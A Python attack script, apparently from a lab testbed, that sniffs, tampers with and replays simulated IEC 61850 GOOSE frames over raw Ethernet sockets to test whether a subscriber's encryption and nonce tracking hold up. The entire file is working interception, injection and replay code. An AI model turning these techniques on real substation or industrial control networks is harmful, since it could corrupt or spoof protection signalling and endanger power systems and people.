#!/usr/bin/env python3
import json
import time
import argparse
import socket

parser = argparse.ArgumentParser(description="Layer 2 GOOSE Adversary (Raw Sockets)")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop')
args = parser.parse_args()

GOOSE_TYPE = 0x88B8
IFACE = "h3-eth0"

captured_raw_frames = []
has_replayed = False  # Prevents infinite replay loops

def start_hacker():
    print(f"[*] =======================================")
    print(f"[*] HACKER TERMINAL ONLINE | Interface: {IFACE}")
    print(f"[*] Attack Mode: {args.attack.upper()}")
    print(f"[*] =======================================\n")
    
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(GOOSE_TYPE))
        sock.bind((IFACE, 0))
    except PermissionError:
        print("[!] Error: Raw sockets require root/sudo privileges.")
        return

    while True:
        raw_frame = sock.recv(2048)
        eth_header = raw_frame[:14]
        payload_bytes = raw_frame[14:]
        
        try:
            payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
            
            # Ignore our own tampered packets so we don't process them twice
            if payload.get("attacker_injected"):
                continue
                
            print(f"\n[!!!] INTERCEPTED GOOSE FRAME [!!!]")
            algo_used = payload.get("algo", "Unknown")
            
            # --- 1. EAVESDROP ATTACK (Breaks Confidentiality) ---
            if args.attack == 'eavesdrop':
                if algo_used != "None (Plaintext)":
                    print(f"    [?] Status: SECURE. Defeated by {algo_used}.")
                    print(f"    [?] Ciphertext: {payload.get('data', '')[:30]}... (Unreadable)")
                else:
                    print("    [!] Status: VULNERABLE. Plaintext detected.")
                    # Decode the hex data back to a string to prove we can read it
                    stolen_data = bytes.fromhex(payload.get("data", "")).decode('utf-8')
                    print(f"    [!] Stolen GOOSE Data: {stolen_data}")

            # --- 2. TAMPER ATTACK (Breaks Integrity) ---
            elif args.attack == 'tamper':
                original_data = payload.get("data", "")
                if len(original_data) > 4:
                    # Swap the last 4 hex characters with "dead"
                    payload["data"] = original_data[:-4] + "dead"
                    payload["attacker_injected"] = True
                    
                    poisoned_frame = eth_header + json.dumps(payload).encode('utf-8')
                    time.sleep(0.005) 
                    sock.send(poisoned_frame)
                    print(f"    [+] Poisoned frame injected! Replaced end of payload with 'dead'")
                    print(f"    [+] Let's see if the Subscriber's {algo_used} catches it...")

            # --- 3. REPLAY ATTACK (Breaks Availability / Freshness) ---
            elif args.attack == 'replay':
                global has_replayed
                captured_raw_frames.append(raw_frame)
                print(f"    [>] REPLAY: Packet captured. Stored: {len(captured_raw_frames)}")
                
                # Trigger the attack exactly once on the 10th packet
                if len(captured_raw_frames) == 10 and not has_replayed:
                    print("    [+] Triggering Replay Attack!")
                    print("    [+] Spoofing Publisher MAC and blasting Packet #5 again...")
                    time.sleep(0.05)
                    # Send an older packet (e.g., the 5th packet we captured)
                    sock.send(captured_raw_frames[4]) 
                    has_replayed = True
                    print("    [+] Replay frame successfully blasted onto the wire!")
                    print(f"    [+] Let's see if the Subscriber's Nonce Tracking drops it...")

        except json.JSONDecodeError:
            pass

if __name__ == "__main__":
    start_hacker()